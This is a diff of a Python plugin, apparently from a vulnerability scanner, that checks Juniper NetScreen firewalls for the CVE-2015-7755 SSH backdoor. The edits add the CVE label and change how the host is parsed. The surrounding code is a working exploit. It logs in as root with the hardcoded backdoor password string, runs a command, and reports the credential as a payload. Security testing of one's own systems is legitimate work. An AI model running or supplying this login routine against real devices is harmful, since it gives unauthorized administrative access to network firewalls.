@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 '''
-name: juniper NetScreen防火墙后门
+name: juniper NetScreen防火墙后门(CVE-2015-7755)
 referer: http://www.freebuf.com/news/90323.html
 author: Lucifer
 description: ssh后门。
@@ -17,11 +17,15 @@ class juniper_netscreen_backdoor_BaseVerify:
         self.url = url
 
     def run(self):
-        #提取host
-        host = urlparse(self.url)[1]
-        flag = host.find(":")
-        if flag != -1:
-            host = host[:flag]
+        if r"http" in self.url:
+            #提取host
+            host = urlparse(self.url)[1]
+            flag = host.find(":")
+            if flag != -1:
+                host = host[:flag]
+        else:
+            host = self.url
+
         try:
             user = "root"
             password = "<<< %s(un='%s') = %u"
@@ -31,7 +35,7 @@ class juniper_netscreen_backdoor_BaseVerify:
             s.sendline(b'Get int')
             s.prompt()
             if s.before.find(b'Interfaces')  is not -1:
-                cprint("[+]存在juniper NetScreen防火墙后门漏洞...(高危)\tpayload: "+host+" "+user+":"+password, "red")
+                cprint("[+]存在juniper NetScreen防火墙后门(CVE-2015-7755)漏洞...(高危)\tpayload: "+host+" "+user+":"+password, "red")
     
             s.logout()
 
